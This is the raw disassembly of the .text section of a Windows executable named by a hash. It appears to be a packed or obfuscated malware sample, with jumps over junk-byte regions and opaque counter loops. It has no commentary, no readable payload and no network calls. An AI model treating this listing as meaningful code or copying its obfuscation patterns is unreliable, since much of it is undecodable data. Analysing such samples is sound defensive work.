
2fb367e3d8cdfad7ac11715ce34d343812813343c329e89f15be23e75c238ade.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x43355b
  40100c:	mov    eax,ds:0x413b16
  401011:	xor    DWORD PTR ds:0x4335f3,edx
  401017:	mov    eax,DWORD PTR [eax+0x198]
  40101d:	mov    ecx,DWORD PTR ds:0x4335a7
  401023:	or     DWORD PTR ds:0x433553,ecx
  401029:	mov    DWORD PTR [ebp-0x8],eax
  40102c:	mov    DWORD PTR ds:0x433543,0x436b
  401036:	jmp    0x40133c
  40103b:	mov    ah,0xd6
  40103d:	ja     0x40109f
  40103f:	jno    0x4010ae
  401041:	mov    bl,0xd2
  401043:	js     0x4010a2
  401045:	repz sbb DWORD PTR [ebx],esi
  401048:	mov    dl,0x8f
  40104a:	xlat   BYTE PTR ds:[ebx]
  40104b:	jl     0x4010c9
  40104d:	jl     0x4010cb
  40104f:	addr16 jle 0x4010ce
  401052:	jl     0x401020
  401054:	xlat   BYTE PTR ds:[ebx]
  401055:	cmp    ecx,edx
  401057:	(bad)
  40105a:	ffree  st(0)
  40105c:	pop    es
  40105d:	push   es
  40105e:	add    eax,DWORD PTR [edx]
  401060:	pushf  
  401061:	add    cl,BYTE PTR [edi]
  401063:	xor    ecx,DWORD PTR [edi]
  401065:	ret    0xc71a
  401068:	adc    bl,BYTE PTR [edi]
  40106a:	inc    ebp
  40106b:	pop    edx
  40106c:	add    dh,BYTE PTR [edi-0x4610f327]
  401072:	fcmovnbe st,st(4)
  401074:	add    ecx,DWORD PTR [esp+0x4da0f6bc]
  40107b:	adc    DWORD PTR [ecx+0x641f44dc],ebp
  401081:	out    dx,al
  401082:	outs   dx,DWORD PTR ds:[esi]
  401083:	or     ebx,DWORD PTR ds:0x42d47a9e
  401089:	test   al,0x53
  40108b:	sub    ebp,ebx
  40108d:	(bad)  
  40108e:	ds test eax,0xabc17b88
  401094:	add    al,0xc6
  401096:	ror    DWORD PTR [ebp-0x3a6d2b7b],cl
  40109c:	jmp    0x4010d0
  40109e:	mov    esi,ebp
  4010a0:	dec    edi
  4010a1:	in     al,0xa4
  4010a3:	dec    ebp
  4010a4:	call   DWORD PTR [edi-0x274af866]
  4010aa:	mov    ecx,0x5134e949
  4010af:	and    esi,DWORD PTR [eax-0x41639318]
  4010b5:	jnp    0x4010d4
  4010b7:	ret    
  4010b8:	nop
  4010b9:	sub    eax,0xc05cebd6
  4010be:	out    0xba,al
  4010c0:	bnd call 0x770f4e56
  4010c6:	popa   
  4010c7:	xlat   BYTE PTR ds:[ebx]
  4010c8:	and    cl,cl
  4010ca:	add    ch,ah
  4010cc:	sbb    eax,0x331a45d
  4010d1:	outs   dx,DWORD PTR ds:[esi]
  4010d2:	ins    DWORD PTR es:[edi],dx
  4010d3:	jp     0x4010df
  4010d5:	cmp    eax,0x2a568cd9
  4010da:	jno    0x40115b
  4010dc:	cmp    al,0x8f
  4010de:	or     bl,bl
  4010e0:	mov    ah,0xb
  4010e2:	pop    ebx
  4010e3:	push   ecx
  4010e4:	(bad)  
  4010e6:	adc    eax,0x25e55ed3
  4010eb:	jge    0x401089
  4010ed:	inc    esp
  4010ee:	dec    ebx
  4010ef:	aaa    
  4010f0:	adc    DWORD PTR [ebx],ebp
  4010f2:	ja     0x401129
  4010f4:	sbb    bl,dl
  4010f6:	cmp    al,0x4f
  4010f8:	jmp    0xb156:0x3568a6c9
  4010ff:	das    
  401100:	xor    al,0xd4
  401102:	fdiv   QWORD PTR [ecx+0x57]
  401105:	mov    cl,BYTE PTR [eax+0x38]
  401108:	jb     0x401142
  40110a:	ror    BYTE PTR es:[ebx-0x2f7089ef],0x38
  401112:	pop    esi
  401113:	dec    edx
  401114:	fcom   DWORD PTR [ecx-0x654ded3e]
  40111a:	lea    esi,[eax+0x63]
  40111d:	mov    ecx,0x23e0b215
  401122:	jbe    0x4010a8
  401124:	push   0x62cf007
  401129:	call   0x9f51:0xe61efcf3
  401130:	(bad)  
  401131:	(bad)  
  401133:	je     0x40119d
  401135:	popa   
  401136:	inc    esp
  401137:	or     DWORD PTR [ebx],esp
  401139:	sub    dh,BYTE PTR [edi-0x78]
  40113c:	js     0x401159
  40113e:	stc    
  40113f:	or     eax,0xae1d1786
  401144:	fldenv [ebx]
  401146:	repz popf 
  401148:	ds rcl eax,0x4
  40114c:	xor    edx,DWORD PTR ds:[edi+eiz*2-0x1f049dd4]
  401154:	loope  0x40116e
  401156:	and    eax,0xd9fb1feb
  40115b:	js     0x401103
  40115d:	ret    
  40115e:	shl    BYTE PTR [edi+0x1eefe23f],0x97
  401165:	fcomp  QWORD PTR [esi-0x6b]
  401168:	mov    ecx,0x61cdcf4b
  40116d:	add    eax,0x55206f25
  401172:	retf   0x2263
  401175:	push   eax
  401176:	ds nop
  401178:	imul   edi,DWORD PTR [edx],0x1d301527
  40117e:	arpl   WORD PTR [ecx+0x12],cx
  401181:	fiadd  DWORD PTR [ecx+0x46d5e4fa]
  401187:	cmp    al,0x77
  401189:	and    al,0xa2
  40118b:	xchg   ebx,eax
  40118c:	mov    edi,0x95bf935
  401191:	test   DWORD PTR [esi],ecx
  401193:	cdq    
  401194:	or     dl,BYTE PTR ds:0x4becdb99
  40119a:	nop
  40119b:	inc    ecx
  40119c:	mov    ds:0xeb5d6b0e,al
  4011a1:	in     al,dx
  4011a2:	inc    eax
  4011a3:	cld    
  4011a4:	cdq    
  4011a5:	stos   BYTE PTR es:[edi],al
  4011a6:	mov    al,0x45
  4011a8:	idiv   BYTE PTR [edx+ebx*4+0xdebe748]
  4011af:	push   ds
  4011b0:	mov    cl,0xf1
  4011b2:	push   ecx
  4011b3:	push   ebp
  4011b4:	test   BYTE PTR [edi-0x55],bl
  4011b7:	add    cl,bl
  4011b9:	cli    
  4011ba:	sbb    eax,0x31275fa6
  4011bf:	dec    edi
  4011c0:	or     ecx,DWORD PTR [ebp-0x35043a66]
  4011c6:	test   BYTE PTR [ebp-0x80],dl
  4011c9:	fdivrp st(3),st
  4011cb:	lea    ebp,[edi]
  4011cd:	xor    BYTE PTR [eax+0xfc523b6],dh
  4011d3:	loopne 0x40122b
  4011d5:	(bad)  
  4011d6:	dec    esp
  4011d7:	push   es
  4011d8:	and    BYTE PTR [ecx+0x2c],bh
  4011db:	in     eax,0x4a
  4011dd:	(bad)  
  4011de:	jns    0x4011c4
  4011e0:	scas   eax,DWORD PTR es:[edi]
  4011e1:	popf   
  4011e2:	lods   al,BYTE PTR ds:[esi]
  4011e3:	scas   al,BYTE PTR es:[edi]
  4011e4:	mov    ecx,DWORD PTR [ecx+0x4148234c]
  4011ea:	xor    al,0x7e
  4011ec:	adc    BYTE PTR [eax],dh
  4011ee:	jge    0x4011c5
  4011f0:	rcl    eax,1
  4011f2:	cmp    ebp,DWORD PTR [ecx]
  4011f4:	xor    DWORD PTR [eax-0x67c7f991],esi
  4011fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4011fb:	jne    0x4011ac
  4011fd:	popa   
  4011fe:	je     0x401255
  401200:	ds mov bl,0x91
  401203:	mov    esp,0x6a8cae2d
  401208:	xlat   BYTE PTR ds:[ebx]
  401209:	and    DWORD PTR [ebx],ecx
  40120b:	pop    ds
  40120c:	mov    eax,ds:0x219e2c7
  401211:	in     eax,0x3b
  401213:	mov    ebx,0xc715bed1
  401218:	dec    ebp
  401219:	outs   dx,BYTE PTR ds:[esi]
  40121a:	cwde   
  40121b:	sbb    eax,DWORD PTR [eax+edi*8-0x13]
  40121f:	pop    esi
  401220:	and    BYTE PTR [ebp-0x6735cd6b],bl
  401226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401227:	mov    ah,0xd
  401229:	sti    
  40122a:	or     ah,BYTE PTR [edx-0x1d]
  40122d:	or     ebp,ebx
  40122f:	xlat   BYTE PTR ds:[ebx]
  401230:	pop    ebx
  401231:	out    dx,al
  401232:	inc    edx
  401233:	or     dl,al
  401235:	mov    ebp,0xd59f2066
  40123a:	or     eax,0xa1cfa552
  40123f:	mov    ecx,0x27923bcf
  401244:	sub    dl,BYTE PTR [ecx+0x51]
  401247:	mov    dl,0x43
  401249:	jo     0x40124f
  40124b:	jmp    0x4012b1
  40124d:	add    al,0x55
  40124f:	std    
  401250:	cmp    eax,0xe3b5d150
  401255:	fsub   st(2),st
  401257:	cmp    al,0x51
  401259:	mov    edx,0xb412ec47
  40125e:	or     ebp,DWORD PTR [esi-0x2faadbe6]
  401264:	loop   0x401206
  401266:	sub    DWORD PTR [ecx-0x52c002b1],0xb15ced43
  401270:	lahf   
  401271:	mov    ecx,0xdaeb6433
  401276:	mov    cl,0x58
  401278:	jmp    0xe8ed6908
  40127d:	inc    edx
  40127e:	fadd   QWORD PTR [edi+0x21]
  401281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401282:	loop   0x40124e
  401284:	add    BYTE PTR [esp+edx*4],dh
  401287:	aad    0x36
  401289:	pop    esp
  40128a:	ss cld 
  40128c:	addr16 (bad) 
  40128e:	push   0xffffffa7
  401290:	es fsubr st(6),st
  401293:	or     DWORD PTR [esi-0xa],esi
  401296:	pop    edx
  401297:	cmp    eax,0xab3b5b75
  40129c:	jnp    0x40127c
  40129e:	lods   al,BYTE PTR ds:[esi]
  40129f:	sti    
  4012a0:	adc    eax,0x732bb952
  4012a5:	bound  edi,QWORD PTR [esi-0x5d]
  4012a8:	call   0x1d559f55
  4012ad:	test   DWORD PTR [ecx-0x76],eax
  4012b0:	jno    0x40123e
  4012b2:	(bad)  
  4012b3:	push   0xffffffc4
  4012b5:	mov    esp,eax
  4012b7:	and    esi,esi
  4012b9:	fnsave [ebp+edx*2-0x77]
  4012bd:	sbb    al,0x15
  4012bf:	and    BYTE PTR [eax+0xd],cl
  4012c2:	dec    esp
  4012c3:	mov    cl,0xe8
  4012c5:	stc    
  4012c6:	push   edx
  4012c7:	int    0x10
  4012c9:	aad    0x23
  4012cb:	popf   
  4012cc:	mov    bh,0x8d
  4012ce:	mov    ss,WORD PTR [ecx-0x7d81ba83]
  4012d4:	sti    
  4012d5:	(bad)  
  4012d7:	and    BYTE PTR [ebx+0x7472b27a],ah
  4012dd:	scas   al,BYTE PTR es:[edi]
  4012de:	packuswb mm1,QWORD PTR [eax]
  4012e1:	iret   
  4012e2:	rol    BYTE PTR [eax-0x31],0x7
  4012e6:	les    esp,FWORD PTR ds:0xbb9782de
  4012ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012ed:	jae    0x401299
  4012ef:	nop
  4012f0:	add    dh,cl
  4012f2:	cmp    ebp,edx
  4012f4:	loope  0x40127c
  4012f6:	inc    ebx
  4012f7:	jae    0x401344
  4012f9:	xlat   BYTE PTR ds:[ebx]
  4012fa:	cmp    eax,0x4afb88fb
  4012ff:	pop    ds
  401300:	dec    esi
  401301:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401302:	arpl   ax,si
  401304:	sub    eax,0x8fdeed30
  401309:	dec    ecx
  40130a:	aad    0x6b
  40130c:	mov    dh,0xc9
  40130e:	jp     0x40131b
  401310:	into   
  401311:	push   ebp
  401312:	call   0x50440423
  401317:	mov    bl,0xb3
  401319:	and    BYTE PTR [esi+ebx*4+0x44],0xfb
  40131e:	jns    0x4012dd
  401320:	cmp    DWORD PTR [esi-0x9fe7bdf],ecx
  401326:	les    eax,FWORD PTR [edi]
  401328:	outs   dx,BYTE PTR ds:[esi]
  401329:	sub    eax,esp
  40132b:	into   
  40132c:	inc    ebp
  40132d:	fcmovbe st,st(3)
  40132f:	pusha  
  401330:	jnp    0x4012f6
  401332:	push   ebx
  401333:	xor    eax,eax
  401335:	fdiv   st(4),st
  401337:	scas   al,BYTE PTR es:[edi]
  401338:	les    edx,FWORD PTR [esi+0x5e]
  40133b:	aas    
  40133c:	mov    eax,DWORD PTR [ebp+0x8]
  40133f:	mov    ecx,DWORD PTR [ebp-0x8]
  401342:	push   ebx
  401343:	or     DWORD PTR ds:0x4335a7,edx
  401349:	push   esi
  40134a:	add    esi,DWORD PTR ds:0x43359b
  401350:	mov    esi,0x7510853
  401355:	and    ebx,0x1c58
  40135b:	xor    eax,esi
  40135d:	and    DWORD PTR ds:0x43361f,0x0
  401367:	jmp    0x401379
  40136c:	mov    ebx,DWORD PTR ds:0x43361f
  401372:	inc    ebx
  401373:	mov    DWORD PTR ds:0x43361f,ebx
  401379:	cmp    DWORD PTR ds:0x43361f,0x11
  401380:	jae    0x4013b5
  401386:	cmp    DWORD PTR ds:0x43361f,0x16
  40138d:	jne    0x4013b0
  401393:	push   0x12df
  401398:	push   DWORD PTR [ebp-0x18]
  40139b:	push   0x49a7
  4013a0:	push   0x1ff7
  4013a5:	push   0x54a2
  4013aa:	call   DWORD PTR ds:0x41224c
  4013b0:	jmp    0x40136c
  4013b5:	push   edi
  4013b6:	or     edi,edi
  4013b8:	mov    edi,0x32729a
  4013bd:	not    ebx
  4013bf:	add    eax,edi
  4013c1:	adc    ebx,0x3cf3
  4013c7:	mov    DWORD PTR [ecx],eax
  4013c9:	sbb    DWORD PTR ds:0x433563,0x6b1e
  4013d3:	lea    eax,[ebp-0x4]
  4013d6:	mov    DWORD PTR [ebp-0x10],eax
  4013d9:	mov    eax,DWORD PTR [ebp+0x8]
  4013dc:	xor    DWORD PTR ds:0x43359f,0x46ad
  4013e6:	mov    ecx,DWORD PTR [ebp-0x10]
  4013e9:	xor    eax,esi
  4013eb:	add    eax,edi
  4013ed:	mov    DWORD PTR ds:0x433597,0x19
  4013f7:	cmp    DWORD PTR ds:0x433597,0x0
  4013fe:	je     0x40144d
  401404:	cmp    DWORD PTR ds:0x433597,0xb
  40140b:	jne    0x401421
  401411:	push   0x433553
  401416:	push   0x62b0
  40141b:	call   DWORD PTR ds:0x41217c
  401421:	cmp    DWORD PTR ds:0x433597,0xc
  401428:	jne    0x40143b
  40142e:	mov    ebx,DWORD PTR ds:0x433597
  401434:	dec    ebx
  401435:	mov    DWORD PTR ds:0x433597,ebx
  40143b:	mov    ebx,DWORD PTR ds:0x433597
  401441:	dec    ebx
  401442:	mov    DWORD PTR ds:0x433597,ebx
  401448:	jmp    0x4013f7
  40144d:	mov    DWORD PTR [ecx],eax
  40144f:	or     DWORD PTR ds:0x43354f,0x433543
  401459:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  401460:	xor    DWORD PTR ds:0x433553,ebx
  401466:	lea    eax,[ebp-0x14]
  401469:	neg    ecx
  40146b:	mov    DWORD PTR [ebp-0x20],eax
  40146e:	mov    eax,DWORD PTR [ebp-0x14]
  401471:	mov    ecx,DWORD PTR [ebp-0x20]
  401474:	xor    eax,esi
  401476:	neg    ebx
  401478:	add    eax,edi
  40147a:	mov    DWORD PTR [ecx],eax
  40147c:	and    DWORD PTR ds:0x43361b,0x0
  401486:	xor    eax,eax
  401488:	add    eax,DWORD PTR ds:0x43361b
  40148e:	inc    eax
  40148f:	mov    ds:0x43361b,eax
  401494:	cmp    DWORD PTR ds:0x43361b,0x9
  40149b:	jne    0x4014ac
  4014a1:	push   0x8c0a
  4014a6:	call   DWORD PTR ds:0x412250
  4014ac:	cmp    DWORD PTR ds:0x43361b,0x8
  4014b3:	jne    0x4014c4
  4014b9:	mov    eax,ds:0x43361b
  4014be:	inc    eax
  4014bf:	mov    ds:0x43361b,eax
  4014c4:	cmp    DWORD PTR ds:0x43361b,0x1c
  4014cb:	jb     0x401486
  4014d1:	mov    eax,ds:0x413bea
  4014d6:	mov    ebx,0x8e12febe
  4014db:	sbb    DWORD PTR ds:0x4335df,0x47a9
  4014e5:	mov    DWORD PTR [ebp-0xc],ebx
  4014e8:	dec    DWORD PTR ds:0x43355b
  4014ee:	mov    eax,DWORD PTR [eax]
  4014f0:	mov    cx,WORD PTR [ebp-0x4]
  4014f4:	movzx  ecx,cx
  4014f7:	sbb    DWORD PTR ds:0x43354f,0x43359f
  401501:	jmp    0x401807
  401506:	mov    dh,0x9a
  401508:	adc    cl,al
  40150a:	adc    BYTE PTR [ecx+0x7d],dh
  40150d:	jne    0x4014ba
  40150f:	arpl   ax,bx
  401511:	ins    DWORD PTR es:[edi],dx
  401512:	cwde   
  401513:	cmp    eax,0x7e67c386
  401518:	jl     0x401596
  40151a:	addr16 jle 0x401599
  40151d:	jl     0x401534
  40151f:	call   0x233c:0x39f60ab2
  401526:	add    DWORD PTR [ecx],eax
  401528:	enter  0xa98f,0x88
  40152c:	std    
  40152d:	push   dx
  40152f:	and    eax,0x613b9887
  401534:	cdq    
  401535:	cmc    
  401536:	mov    ebx,0x1b572be
  40153b:	lea    edx,[edi+edi*4]
  40153e:	(bad)  
  40153f:	and    al,0x75
  401541:	aad    0x8b
  401543:	scas   eax,DWORD PTR es:[edi]
  401544:	cmp    BYTE PTR [ebp-0x5e],ch
  401547:	mov    eax,ds:0xad660892
  40154c:	push   es
  40154d:	mov    eax,ds:0x97fe5e48
  401552:	pop    ds
  401553:	fstp   QWORD PTR [esi]
  401555:	fstp   st(7)
  401557:	lods   al,BYTE PTR ds:[esi]
  401558:	outs   dx,BYTE PTR ds:[esi]
  401559:	sub    eax,0x1f663e59
  40155e:	jmp    FWORD PTR [esi-0x262c1da]
  401564:	or     ebx,ebp
  401566:	call   FWORD PTR [ebx+0x4246210]
  40156c:	sar    BYTE PTR [eax+0x193e959f],0xcc
  401573:	fld    TBYTE PTR [edi-0x43]
  401576:	cli    
  401577:	xor    esp,DWORD PTR [eax-0x131c4661]
  40157d:	inc    ebp
  40157e:	jg     0x401508
  401580:	js     0x40159a
  401582:	loop   0x4015d3
  401584:	push   ebp
  401585:	retf   
  401586:	push   ebx
  401587:	mov    ch,0xb
  401589:	shl    DWORD PTR ds:0xc2b36f87,cl
  40158f:	int    0x95
  401591:	cmc    
  401592:	push   es
  401593:	mov    al,ds:0x97fcf555
  401598:	inc    ebp
  401599:	leave  
  40159a:	cmp    eax,0x37a9c826
  40159f:	add    eax,0x22de3b6f
  4015a4:	out    dx,al
  4015a5:	out    0x3f,al
  4015a7:	mov    dl,0xd9
  4015a9:	inc    ebp
  4015aa:	xchg   esi,eax
  4015ab:	(bad)
  4015ae:	in     eax,dx
  4015af:	cmp    ebp,DWORD PTR [ebp+0x2c164d4e]
  4015b5:	sub    ecx,ecx
  4015b7:	pop    edx
  4015b8:	sti    
  4015b9:	pop    edx
  4015ba:	pop    esp
  4015bb:	push   0xf52bf8bd
  4015c0:	arpl   WORD PTR [esp+ecx*2-0x3f9ba612],dx
  4015c7:	out    dx,eax
  4015c8:	(bad)  
  4015c9:	out    0x46,al
  4015cb:	push   0xfffffff8
  4015cd:	and    ecx,ebp
  4015cf:	scas   eax,DWORD PTR es:[edi]
  4015d0:	push   esi
  4015d1:	(bad)  
  4015d2:	sbb    ecx,eax
  4015d4:	xchg   ebp,eax
  4015d5:	jae    0x40162e
  4015d7:	ds fucomp st(1)
  4015da:	jle    0x4015de
  4015dc:	mov    ?,WORD PTR [edx]
  4015de:	jp     0x401636
  4015e0:	mov    ds:0xc82114f2,al
  4015e5:	jle    0x40160d
  4015e7:	cmp    esp,DWORD PTR [edi-0x13b6e686]
  4015ed:	and    eax,0x9eb7f99d
  4015f2:	push   ebp
  4015f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015f4:	fs into 
  4015f6:	pop    ds
  4015f7:	xchg   BYTE PTR [eax-0x38],cl
  4015fa:	pop    ebx
  4015fb:	pop    ecx
  4015fc:	shl    ebp,cl
  4015fe:	push   cs
  4015ff:	rcl    eax,0xe2
  401602:	adc    al,0x0
  401604:	adc    eax,0xd264544
  401609:	mov    ch,0x9a
  40160b:	push   edx
  40160c:	imul   BYTE PTR [ecx-0x2]
  40160f:	sti    
  401610:	push   ebx
  401611:	push   ecx
  401612:	xor    dl,BYTE PTR [eax-0x6f]
  401615:	mov    al,0xa5
  401617:	push   esi
  401618:	mov    ebp,DWORD PTR [ecx]
  40161a:	push   es
  40161b:	sub    DWORD PTR [edi+ecx*4],ecx
  40161e:	into   
  40161f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401620:	cld    
  401621:	xor    eax,0xc696d126
  401626:	mov    eax,ds:0x9bd7610
  40162b:	sbb    DWORD PTR [eax-0x7b78a897],edi
  401631:	or     ecx,DWORD PTR [ebp+0x4f906f72]
  401637:	outs   dx,DWORD PTR ds:[esi]
  401638:	sub    bl,BYTE PTR [esi-0x31]
  40163b:	ins    DWORD PTR es:[edi],dx
  40163c:	sub    BYTE PTR [edx-0x531d6153],cl
  401642:	out    0x15,al
  401644:	scas   al,BYTE PTR es:[edi]
  401645:	dec    ecx
  401646:	mov    ecx,0x74c89d3d
  40164b:	add    ecx,DWORD PTR [edi+0x67]
  40164e:	jle    0x401675
  401650:	in     al,0xf2
  401652:	cmp    DWORD PTR [edx+0x41],0x6dc03714
  401659:	inc    edi
  40165a:	lds    ebx,FWORD PTR [ecx]
  40165c:	xor    eax,DWORD PTR [ebx-0x74]
  40165f:	(bad)  
  401660:	sub    BYTE PTR [ebx-0xa],al
  401663:	mov    cl,0x23
  401665:	jge    0x401636
  401667:	mov    eax,ds:0x6377b75d
  40166c:	ror    DWORD PTR [eax],0xb6
  40166f:	dec    esi
  401670:	sbb    ah,BYTE PTR [ebx]
  401672:	push   ebx
  401673:	sbb    al,0xa0
  401675:	aad    0xfe
  401677:	jnp    0x401604
  401679:	(bad)  
  40167b:	jle    0x4016c8
  40167d:	pop    ebx
  40167e:	xchg   edi,eax
  40167f:	pop    edi
  401680:	xchg   esp,eax
  401681:	mov    ah,0x3b
  401683:	cld    
  401684:	lea    edx,[ebp+0x4]
  401687:	or     esi,edi
  401689:	scas   eax,DWORD PTR es:[edi]
  40168a:	adc    al,BYTE PTR [eax+0x6c]
  40168d:	add    DWORD PTR [ecx+0x1e1a34f9],ecx
  401693:	push   0x3e017fff
  401698:	add    esp,esp
  40169a:	jge    0x40165f
  40169c:	pop    ecx
  40169d:	(bad)  
  40169f:	ds mov ah,0x5a
  4016a2:	sub    eax,DWORD PTR [edi+eax*1+0x48]
  4016a6:	jae    0x401706
  4016a8:	and    dl,bh
  4016aa:	pop    edi
  4016ab:	xchg   edi,eax
  4016ac:	xor    DWORD PTR [ebx],ebx
  4016ae:	pushf  
  4016af:	add    BYTE PTR ds:0xaaf2e215,dh
  4016b5:	ja     0x4016e4
  4016b7:	sbb    BYTE PTR [edx-0x71],ch
  4016ba:	dec    ecx
  4016bb:	sbb    BYTE PTR fs:[ebx],ch
  4016be:	popf   
  4016bf:	mov    edx,0x6fdf4d3
  4016c4:	loope  0x4016f0
  4016c6:	push   esp
  4016c7:	cmp    cl,bh
  4016c9:	pop    esi
  4016ca:	scas   eax,DWORD PTR es:[edi]
  4016cb:	je     0x4016b3
  4016cd:	lock mov edx,0x9689e183
  4016d3:	test   bh,0x4
  4016d6:	out    dx,al
  4016d7:	sbb    BYTE PTR [ecx+0x6cc0109b],al
  4016dd:	inc    edi
  4016de:	add    ch,BYTE PTR [ebx+0x11]
  4016e1:	and    BYTE PTR [ebp+0x53],al
  4016e4:	imul   esi,DWORD PTR [ecx],0x6f
  4016e7:	clc    
  4016e8:	mov    bl,BYTE PTR [edi]
  4016ea:	shl    dl,cl
  4016ec:	pop    esp
  4016ed:	loop   0x401740
  4016ef:	lea    esi,[edx]
  4016f1:	mov    ecx,0x68644c33
  4016f6:	add    BYTE PTR [esi],dh
  4016f8:	pop    es
  4016f9:	pop    ax
  4016fb:	mov    ch,0x7e
  4016fd:	pop    es
  4016fe:	or     DWORD PTR [esi-0x25],ebp
  401701:	idiv   ebx
  401703:	mov    eax,ds:0x3178c918
  401708:	icebp  
  401709:	mov    ah,0x5a
  40170b:	or     eax,ebp
  40170d:	fucomp st(6)
  40170f:	mov    edx,0xba67a86
  401714:	iret   
  401715:	xchg   ebp,eax
  401716:	mov    ch,0x2b
  401718:	sub    esi,DWORD PTR [esi]
  40171a:	(bad)  
  40171b:	mov    al,ds:0x7479787e
  401720:	cmp    eax,0x57b5dd1
  401725:	nop
  401726:	mov    cl,0x97
  401728:	fwait
  401729:	cdq    
  40172a:	stos   DWORD PTR es:[edi],eax
  40172b:	in     al,dx
  40172c:	lock aam 0xee
  40172f:	jmp    0x4017ae
  401731:	push   esp
  401732:	ret    0x85ca
  401735:	fist   DWORD PTR [edx-0x78]
  401738:	test   eax,0xdc28ea86
  40173d:	(bad)  
  40173e:	cli    
  40173f:	gs push cs
  401741:	out    0x52,al
  401743:	mov    ecx,0xb5b2ed79
  401748:	mov    ebx,0xb61d4773
  40174d:	mov    eax,ds:0xb4c94abe
  401752:	(bad)  
  401753:	nop
  401754:	mov    ebp,0x2cbfae9
  401759:	(bad)  
  40175a:	out    dx,eax
  40175b:	fcmovnbe st,st(6)
  40175d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40175e:	dec    esp
  40175f:	pop    es
  401760:	xchg   ebp,eax
  401761:	dec    eax
  401762:	popa   
  401763:	or     DWORD PTR [edx],ebp
  401765:	add    ah,BYTE PTR [eax-0x30]
  401768:	rcr    BYTE PTR [edx+0x5c7eef32],cl
  40176e:	cmp    cl,BYTE PTR [eax+0x6e]
  401771:	call   0xf2fc6610
  401776:	xor    DWORD PTR [edi],edx
  401778:	mov    dh,ch
  40177a:	jne    0x401725
  40177c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40177d:	rol    DWORD PTR [edx+0x30],cl
  401780:	rcr    DWORD PTR [ecx+esi*2+0x6a],cl
  401784:	push   eax
  401785:	lods   eax,DWORD PTR ds:[esi]
  401786:	fdiv   st(5),st
  401788:	adc    eax,0xdcdad142
  40178d:	into   
  40178e:	int    0x7e
  401790:	shr    al,0xe
  401793:	(bad)  
  401794:	fcomip st,st(6)
  401796:	popa   
  401797:	dec    edx
  401798:	iret   
  401799:	or     DWORD PTR [eax],ebp
  40179b:	pop    ebp
  40179c:	lahf   
  40179d:	pop    ebp
  40179e:	jmp    0x40175a
  4017a0:	sub    eax,0x413d7493
  4017a5:	inc    ebx
  4017a6:	imul   edi,DWORD PTR [esi-0x9b1b404],0x45
  4017ad:	gs dec ecx
  4017af:	jne    0x4017b6
  4017b1:	div    BYTE PTR [ebx+0x60]
  4017b4:	fstp   TBYTE PTR [edi+0x5b]
  4017b7:	mov    dh,0x3e
  4017b9:	call   0x165e:0xf571410d
  4017c0:	cmp    al,0x95
  4017c2:	ret    0x8164
  4017c5:	mov    dl,0x14
  4017c7:	jg     0x40183a
  4017c9:	je     0x40177b
  4017cb:	mov    ds:0xe84573d5,eax
  4017d0:	pop    ebp
  4017d1:	bound  ecx,QWORD PTR [edx+0x4c]
  4017d4:	xor    BYTE PTR [edi],ch
  4017d6:	mov    cl,0xee
  4017d8:	or     eax,DWORD PTR [edx+ecx*4+0x44]
  4017dc:	ret    
  4017dd:	push   esi
  4017de:	repnz sub ah,BYTE PTR [eax]
  4017e1:	pop    es
  4017e2:	ins    DWORD PTR es:[edi],dx
  4017e3:	xor    eax,0x64645dee
  4017e8:	add    al,0xbc
  4017ea:	mov    bh,0xeb
  4017ec:	out    dx,al
  4017ed:	fcom   DWORD PTR [ecx]
  4017ef:	push   esp
  4017f0:	add    DWORD PTR [ecx-0x18],ebp
  4017f3:	dec    ecx
  4017f4:	add    eax,0x3caf24c8
  4017f9:	popa   
  4017fa:	fmul   st(7),st
  4017fc:	js     0x401853
  4017fe:	and    eax,0xf2fe064f
  401803:	dec    ebp
  401804:	or     al,0xda
  401806:	adc    DWORD PTR [ebx],eax
  401808:	or     BYTE PTR [ecx+0x433657],ah
  40180e:	add    DWORD PTR ds:0x43354b,eax
  401814:	mov    DWORD PTR [ebp-0x18],ecx
  401817:	mov    eax,DWORD PTR [ebp+0x8]
  40181a:	xor    DWORD PTR ds:0x43359b,0x1391
  401824:	mov    ecx,DWORD PTR [ebp-0x8]
  401827:	xor    eax,esi
  401829:	add    eax,edi
  40182b:	cmp    DWORD PTR [ecx],eax
  40182d:	mov    DWORD PTR ds:0x43359b,0x716
  401837:	jne    0x402597
  40183d:	mov    eax,DWORD PTR [ebp+0x8]
  401840:	add    DWORD PTR ds:0x433563,edi
  401846:	mov    ecx,DWORD PTR [ebp-0x18]
  401849:	or     DWORD PTR ds:0x43362f,0x433617
  401853:	xor    eax,esi
  401855:	add    eax,edi
  401857:	cmp    DWORD PTR [ecx],eax
  401859:	jne    0x401f33
  40185f:	sbb    ecx,DWORD PTR ds:0x4335ab
  401865:	mov    eax,DWORD PTR [ebp+0x8]
  401868:	mov    DWORD PTR ds:0x4335e7,0x18
  401872:	cmp    DWORD PTR ds:0x4335e7,0x0
  401879:	je     0x4018bc
  40187f:	cmp    DWORD PTR ds:0x4335e7,0x28
  401886:	jne    0x4018a2
  40188c:	push   DWORD PTR [ebp-0x24]
  40188f:	push   DWORD PTR [ebp-0xc]
  401892:	push   0x6fcb
  401897:	push   0x70d4
  40189c:	call   DWORD PTR ds:0x4120b4
  4018a2:	xor    edx,edx
  4018a4:	add    edx,DWORD PTR ds:0x4335e7
  4018aa:	dec    edx
  4018ab:	mov    DWORD PTR ds:0x4335e7,edx
  4018b1:	jmp    0x401872
  4018b6:	adc    edx,0x63fa
  4018bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4018bf:	and    DWORD PTR ds:0x433617,0x0
  4018c9:	jmp    0x4018db
  4018ce:	mov    edx,DWORD PTR ds:0x433617
  4018d4:	inc    edx
  4018d5:	mov    DWORD PTR ds:0x433617,edx
  4018db:	cmp    DWORD PTR ds:0x433617,0x15
  4018e2:	jae    0x401910
